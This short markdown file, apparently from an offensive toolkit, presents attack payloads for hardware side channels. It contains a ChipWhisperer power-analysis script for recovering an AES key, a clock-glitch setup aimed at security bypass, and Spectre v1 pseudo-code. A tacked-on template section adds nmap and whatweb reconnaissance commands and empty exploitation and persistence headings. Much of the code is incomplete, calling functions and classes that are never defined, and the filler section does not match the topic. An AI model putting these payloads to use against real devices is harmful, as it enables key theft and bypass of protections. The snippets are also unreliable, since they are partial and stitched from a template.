# Payloads — hardware-side-channel-advanced

> Attack payloads for hardware-side-channel-advanced.

## DPA (Differential Power Analysis)

```python
import numpy as np
from chipwhisperer.analyzer.attacks.models.AES128_8bit import AES128_8bit

# Capture traces
traces = capture_traces(target, num_traces=10000)
plaintexts = capture_plaintexts(target, num_traces=10000)

# DPA attack
attack = CPA()
attack.model = AES128_8bit
attack.traces = traces
attack.plaintexts = plaintexts
key = attack.recover_key()
```

## Glitching

```python
import chipwhisperer as cw

scope = cw.scope()
scope.glitch.clk_src = 'clkgen'
scope.glitch.offset = 1000  # Fine-tune
scope.glitch.width = 100    # Glitch width
scope.glitch.ext_offset = 5 # When to glitch (in clock cycles)

target = cw.target(scope)
# Glitch repeatedly; monitor for bypass
```

## Spectre Variant

```c
// Pseudo-code for Spectre v1 (bounds check bypass)
if (x < array_size) {
    y = array[x];  // Bounds check speculated past
    cache_probe(y * 4096);  // Side-channel probe
}
```


---

## Additional Payloads

### Reconnaissance

```bash
# Fingerprint target
nmap -sV target.com
whatweb target.com
```

### Exploitation

```bash
# Various exploitation payloads
# (See kali-claw for full library)
```

### Persistence

```bash
# Persistence techniques
# (Depends on specific target)
```
